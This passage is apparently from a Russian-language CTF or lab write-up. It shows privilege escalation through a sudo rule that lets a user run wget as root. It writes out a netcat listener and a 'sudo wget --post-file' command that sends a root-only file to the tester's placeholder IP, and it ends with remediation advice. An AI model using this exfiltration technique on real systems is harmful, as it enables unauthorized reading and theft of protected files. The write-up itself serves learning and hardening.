## Повышение привилегий

После входа я проверил разрешённые команды через `sudo`. Пользователь мог запускать `/usr/bin/wget` с правами root.

`wget` умеет отправлять содержимое локального файла на внешний HTTP-сервер через `--post-file`. Это позволяет извлечь файл, даже если интерактивного root-shell нет.

На своей машине я запустил listener:

```bash
nc -lvnp 8080
```

А на целевой машине использовал разрешённую команду:

```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<ВАШ_IP>:8080
```

![Проверка разрешённого запуска wget](../images/Pasted%20image%2020260317163026.png)

Исходная заметка также фиксирует, что поиск `user.txt` стандартной командой результата не дал:

```bash
find / -name "user.txt" 2>/dev/null
```

Это не означает, что файла нет: он может называться иначе или находиться в каталоге, который текущий пользователь не может прочитать.

## Вывод

Основная цепочка: веб-разведка → утёкший SSH-ключ → доступ к пользователю → `sudo wget` → чтение root-файла через исходящий HTTP-запрос.

Нужно убрать приватные ключи из web-root, заменить скомпрометированные ключи и ограничить `sudo` конкретными безопасными аргументами. Разрешение запускать универсальную утилиту вроде `wget` от root фактически даёт возможность читать произвольные файлы.
